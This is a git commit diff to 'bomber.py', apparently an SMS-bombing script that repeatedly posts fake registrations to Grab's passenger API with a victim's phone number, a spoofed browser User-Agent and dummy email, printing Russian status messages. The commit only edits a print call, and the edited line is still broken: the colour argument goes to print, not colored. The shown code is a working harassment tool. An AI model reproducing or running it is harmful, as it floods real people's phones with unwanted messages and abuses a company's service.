8fbf655e3db002786dc8d374aa3baf0b1c6a426c
DarkSuana <53618389+DarkSuana@users.noreply.github.com>
2020-02-18 16:09:11 +0300

    Update bomber.py

--- bomber.py
+++ bomber.py
@@ -43,7 +43,7 @@ while True:
 	email = _name+f'{iteration}'+'@gmail.com'
 	try:
 		requests.post('https://p.grabtaxi.com/api/passenger/v2/profiles/register', data={'phoneNumber': _phone,'countryCode': 'ID','name': 'test','email': 'mail@mail.com','deviceToken': '*'}, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.117 Safari/537.36'})
-		print(colored"([+] Grab отправлено)", 'lawngreen')
+		print(colored("[+] Grab отправлено"), 'lawngreen')
 	except:
 		print('[-] Не отправлено!')
 
